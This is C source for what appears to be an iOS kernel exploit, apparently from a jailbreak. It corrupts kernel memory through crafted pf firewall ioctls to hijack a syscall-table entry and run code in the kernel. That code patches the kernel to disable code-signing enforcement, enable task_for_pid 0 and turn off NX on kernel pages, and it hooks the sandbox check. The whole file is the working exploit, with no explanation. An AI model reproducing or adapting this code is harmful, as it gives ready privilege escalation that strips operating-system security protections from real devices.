#define PF 1
#define PRIVATE 1
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <assert.h>
#include <stddef.h>
#include <stdio.h>
#include "pfvar.h"
#include <stdlib.h>
#include <string.h>
#include <config/config.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <net/if.h>

#define DEBUG

#ifndef DEBUG
// strings are big and not very sneaky.
#undef assert
#define assert(x) do { if(!(x)) abort(); } while(0)
#endif

#if 1
#undef assert
#define assert(x) do { if(!(x)) failz(__LINE__); } while(0)

static void failz(int line) {
    line += 10000;
    sysctlbyname("net.inet6.ip6.hdrnestlimit", NULL, 0, &line, sizeof(line));
    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}
#endif

static int pffd;

static void pwn(unsigned int addr) {
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    struct pfioc_rule pr;

    memset(&trans, 0, sizeof(trans));
    memset(&trans_e, 0, sizeof(trans_e));
    memset(&pr, 0, sizeof(pr));

    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    memset(trans_e.anchor, 0, MAXPATHLEN);
    assert(!ioctl(pffd, DIOCXBEGIN, &trans)); 
    u_int32_t ticket = trans_e.ticket;

    assert(!ioctl(pffd, DIOCBEGINADDRS, &pp));
    u_int32_t pool_ticket = pp.ticket;

    pr.action = PF_PASS;
    pr.nr = 0;
    pr.ticket = ticket;
    pr.pool_ticket = pool_ticket;
    memset(pr.anchor, 0, MAXPATHLEN);
    memset(pr.anchor_call, 0, MAXPATHLEN);

    pr.rule.return_icmp = 0;
    pr.rule.action = PF_PASS;
    pr.rule.af = AF_INET;
    pr.rule.proto = IPPROTO_TCP;
    pr.rule.rt = 0;
    pr.rule.rpool.proxy_port[0] = htons(1);
    pr.rule.rpool.proxy_port[1] = htons(1);

    pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
    pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;
    
    pr.rule.overload_tbl = (void *)(addr - 0x4a4);
    
    errno = 0;

    assert(!ioctl(pffd, DIOCADDRULE, &pr));

    assert(!ioctl(pffd, DIOCXCOMMIT, &trans));

    pr.action = PF_CHANGE_REMOVE;
    assert(!ioctl(pffd, DIOCCHANGERULE, &pr));
}

extern void patch_start();
extern void patch_end();

static void (*flush_dcache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_FLUSH_DCACHE;
static void (*invalidate_icache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_INVALIDATE_ICACHE;
static void (*copyin)(void *uaddr, void *kaddr, size_t len) = (void *) CONFIG_COPYIN;
static void (*IOLog)(char *fmt, ...) = (void *) CONFIG_IOLOG;

static inline void flush(void *addr, unsigned size) {
    flush_dcache(addr, size, false);
    invalidate_icache(addr, size, false);
}

static int ok_go_real(void *p, void *uap, unsigned int *retval) {
#ifdef DEBUG
    IOLog("Whoa, I'm here!...\n");
#endif
    /**((unsigned int *) (CONFIG_MAC_POLICY_LIST + 8) = 1;
    *((unsigned int *) (CONFIG_MAC_POLICY_LIST + 12) = 2;
    *((unsigned int *) 0xdeadbeef) = 0xdeadf00d;*/
#   define P(patch) do { *((unsigned int *) CONFIG_##patch) = CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, 4, false); flush((void *) CONFIG_##patch, 4); } while(0)

    P(PATCH1);
    P(PATCH3);
    P(PATCH_CS_ENFORCEMENT_DISABLE);
    P(PATCH_KERNEL_PMAP_NX_ENABLED);
    P(PATCH_TFP0);
    *((unsigned int *) CONFIG_SYSENT_PATCH) = CONFIG_SYSENT_PATCH_ORIG;
    flush((void *) CONFIG_SYSENT_PATCH, 4);

    unsigned int copysize = (char *)(&patch_end) - (char *)(&patch_start);
    copyin(&patch_start, (void *) CONFIG_SCRATCH, copysize);
    flush((void *) CONFIG_SCRATCH, copysize);
    
    // *this* won't work on thumb-1...
    *((unsigned int *) CONFIG_SB_EVALUATE) = 0xf000f8df; // ldr pc, [pc]
    *((unsigned int *) (CONFIG_SB_EVALUATE + 4)) = CONFIG_SCRATCH | 1;
    flush((void *) CONFIG_SB_EVALUATE, 8);
    
    return 0;

}

__attribute__((section("__HIGHROAD,__highroad"), naked, used))
static int ok_go(void *p, void *uap, unsigned int *retval) {
    asm(CONFIG_LOTS_OF_NOPS);
    unsigned int ok = ((unsigned int) &ok_go_real) | 1;
    asm("bx %0" :: "r"(ok));
}

int main() {
    unsigned int target_addr = CONFIG_TARGET_ADDR;
    unsigned int target_pagebase = target_addr & ~0xfff;
    unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
    // Yes, reopening is necessary
    pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    assert(!ioctl(pffd, DIOCSTART));
    while(num_decs--)
        pwn(CONFIG_SYSENT_PATCH+3);
    assert(!ioctl(pffd, DIOCSTOP));
    close(pffd);
    
    assert(!mlock((void *) ((unsigned int)(&ok_go_real) & ~0xfff), 0x1000));
    assert(!mlock((void *) ((unsigned int)(&flush) & ~0xfff), 0x1000));
    assert(!mlock((void *) ((unsigned int)(&ok_go) & ~0xfff), 0x1000));
#ifdef DEBUG
    printf("ok\n"); fflush(stdout);
#endif
    syscall(0);
#ifdef DEBUG
    printf("we're out\n"); fflush(stdout);
#endif
    
    // turn this fancy stuff back on
    int one = 1;
    assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));

    failz(42);
    return 0;
    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}
